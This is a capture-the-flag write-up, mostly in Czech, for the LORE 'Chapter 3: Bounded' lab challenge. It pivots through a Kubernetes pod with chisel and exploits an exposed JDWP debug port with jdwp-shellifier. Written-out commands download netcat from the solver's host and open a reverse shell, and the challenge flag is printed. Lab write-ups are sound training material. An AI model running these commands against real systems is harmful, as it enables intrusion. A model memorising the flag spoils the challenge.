# Chapter 3: Bounded (5)

## Zadání

Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

* The entry point to LORE is at <http://intro.lore.tcc>.

See you in the next incident!

## Nápovědy (Hints)

* Be sure you enter flag for correct chapter.
* In this realm, challenges should be conquered in a precise order, and to triumph over some, you'll need artifacts acquired from others - a unique twist that defies the norms of typical CTF challenges.
* All systems related to Chapter 3 restarts on failed healthcheck (5mins).

## Řešení

Webová stránka ze zadání obsahuje pouze odkazy na 4 úlohy ve skupině LORE.

Webová stránka pro tuto úlohu je <http://jgames.lore.tcc/> na které běží [tictactoe](https://github.com/arringtonm/tictactoe.git). S drobnou úpravou v `index.html`.

```diff
      DESERT WARFARE<br>
      AIR-TO-GROUND ACTIONS<br>
-      THEATERWIDE TACTICAL WARFARE<br>
+      KUBERNETES TACTICAL ENGAGEMENT<br>
      THEATERWIDE BIOTOXIC AND CHEMICAL WARFARE<br><br>
      GLOBAL THERMONUCLEAR WAR<br>
```

Začneme skenováním portů

`nmap jgames.lore.tcc`

```text
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
```

Rozdíl v `index.html` nám dává nápovědu, že stroj s webovou stránkou je součástí Kubernetes a proto dále použijeme reverse shell na PC pimpam z úlohy [Chapter 2: Origins](../16_Chapter1_Origins/README.md).

Na lokální počítač si stáhneme staticky přeložený [nmap](https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.94SVN) a spustíme web server

`python -m http.server 80`.

Na PC pimpam si nmap stáhneme

```text
cd /tmp
curl http://10.200.0.24/nmap-7.94SVN-x86_64-portable.tar.gz -O
tar axf nmap-7.94SVN-x86_64-portable.tar.gz
```

Lokální IP adresu pimpam si zjistíme pomocí `ip addr`, je `192.168.73.124`.

Proskenujeme rozsah `192.168.73.*`

`/tmp/nmap -sn 192.168.73.*`

```text
Nmap scan report for 192.168.73.64
Nmap scan report for 192-168-73-102.intro-web.intro.svc.cluster.local (192.168.73.102)
Nmap scan report for 192-168-73-105.jgames-debug.jgames.svc.cluster.local (192.168.73.105)
Nmap scan report for 192-168-73-112.calico-kube-controllers-metrics.calico-system.svc.cluster.local (192.168.73.112)
Nmap scan report for 192-168-73-114.kube-dns.kube-system.svc.cluster.local (192.168.73.114)
Nmap scan report for 192-168-73-115.ingress-nginx-controller.ingress-nginx.svc.cluster.local (192.168.73.115)
Nmap scan report for 192-168-73-117.webhook-service.metallb-system.svc.cluster.local (192.168.73.117)
Nmap scan report for 192.168.73.118
Nmap scan report for 192-168-73-120.sam-web.sam-operator.svc.cluster.local (192.168.73.120)
Nmap scan report for 192-168-73-121.kube-dns.kube-system.svc.cluster.local (192.168.73.121)
Nmap scan report for 192-168-73-122.cgit-web.cgit.svc.cluster.local (192.168.73.122)
Nmap scan report for 192-168-73-123.whoami-service.default.svc.cluster.local (192.168.73.123)
Nmap scan report for pimpam-9bd6b669c-f5hff (192.168.73.124)
```

Server hostující jgames má IP adresu `192.168.73.105`. Zjistíme otevřené porty

`./nmap 192.168.73.105 -p-`

```text
PORT     STATE SERVICE
5005/tcp open  unknown
8080/tcp open  http-alt
```

Na serveru jako server běží Apache Tomcat, který port 5005 používá pro ladění aplikace (JDWP).

Abychom mohli používat nástroje na vlastním stroji použijeme tzv. Pivoting (tunelování) prostřednictvím SW chisel, který je na PC pimpam předinstalovaný v `/usr/local/sbin` a pro nástroje nepodporující SOCKS5 proxy použijeme proxychains. Viz <https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/#reverse-dynamic-socks-proxy> a <https://ap3x.github.io/posts/pivoting-with-chisel/>.

Další možností je použí [ligolo-ng](https://github.com/nicocha30/ligolo-ng), které má více možností a není potřeba používat proxychain, ale muselo by se na server nahrát.

na vlastním PC spustíme

`chisel server -p 8080 --reverse`

```text
2024/10/16 20:35:15 server: Reverse tunnelling enabled
2024/10/16 20:35:15 server: Fingerprint 40wr8Aloqza9ONP8nQfJ5ma0f29PYJvt8e8dF8ibm4c=
2024/10/16 20:35:15 server: Listening on http://0.0.0.0:8080
```

Na PC pimpam spustíme

`chisel client 10.200.0.24:8080 R:socks`

```text
2024/10/16 18:35:28 client: Connecting to ws://10.200.0.24:8080
2024/10/16 18:35:28 client: Connected (Latency 6.877538ms)
```

nastavíme `/etc/proxychains4.conf`

```text
[ProxyList]
socks5  127.0.0.1 1080
```

Pro spouštění vlastního kódu prostřednictvím použijeme [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier).

Na PC jgames není nainstalovaný `nc`, tak si ho tam stáhneme z vlastního pc. Jako breakpoint trigger se použije `java.lang.String.indexOf`.

```text
proxychains python jdwp-shellifier.py -t 192.168.73.105 -p 5005 --break-on 'java.lang.String.indexOf' -c 'curl http://10.200.0.24/nc -o /tmp/nc'

proxychains python jdwp-shellifier.py -t 192.168.73.105 -p 5005 --break-on 'java.lang.String.indexOf' -c 'chmod +x /tmp/nc'
```

Na vlastním PC spustíme poslouchání na portu 4445.

`nc -vlnp 4445`

a vyvoláme reverse shell

`proxychains python jdwp-shellifier.py -t 192.168.73.105 -p 5005 --break-on 'java.lang.String.indexOf' -c '/tmp/nc 10.200.0.24 4445 -e /bin/sh'`

Dojde ke spojení na náš počítač, příkazem `set` si zobrazíme proměnné prostředí, ve kterých se skrývá hledaný FLAG.

Bohužel služba JDWP byla často nedostupná a proto byla dodatečně doplněna její kontrola a případný restart serveru. Pokud se jeden uživatel připojí k JDWP rozhraní, další připojení až není povoleno.

## Flag

`FLAG{ijBw-pfxY-Scgo-GJKO}`
